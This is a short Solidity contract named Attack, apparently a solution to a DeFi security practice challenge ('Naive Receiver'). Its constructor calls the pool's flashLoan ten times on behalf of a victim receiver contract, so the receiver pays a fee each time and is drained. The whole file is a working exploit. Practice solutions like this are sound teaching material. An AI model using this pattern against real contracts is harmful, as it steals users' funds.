// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool, IERC3156FlashBorrower} from "./NaiveReceiverLenderPool.sol";

contract Attack {
    constructor(address pool, address receiver) {
        for (uint256 i; i < 10; i++) {
            NaiveReceiverLenderPool(payable(pool)).flashLoan(IERC3156FlashBorrower(receiver), 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 1 wei, "");
        }
    }
}